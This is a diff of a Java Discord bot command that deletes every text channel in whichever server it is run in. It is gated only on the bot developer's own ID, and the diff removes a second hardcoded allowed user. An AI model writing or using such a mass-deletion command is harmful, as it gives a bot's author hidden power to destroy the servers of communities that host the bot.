@@ -14,16 +14,17 @@ public class DeleteTextChannelsCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("725452437342912542")) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
             return;
         }
+
         List<TextChannel> textChannels = event.getGuild().getTextChannels();
         int tcSize = textChannels.size();
 
         try {
             for (int i = 0; i <= tcSize; i++) {
                 try {
-                    textChannels.get(i).delete().queue();
+                        textChannels.get(i).delete().queue();
                 } catch (HierarchyException | IndexOutOfBoundsException ignored) {
 
                 }
@@ -47,11 +48,16 @@ public class DeleteTextChannelsCommand implements ICommand {
 
     @Override
     public String[] getAlias() {
-        return new String[] {"deltc","deletetextchannels","deletetc"};
+        return new String[]{"deltc", "deletetextchannels", "deletetc"};
     }
 
-     @Override
+    @Override
     public Category getCategory() {
         return Category.OWNER;
+    }
+
+    @Override
+    public boolean isPremium() {
+        return false;
     }
 }
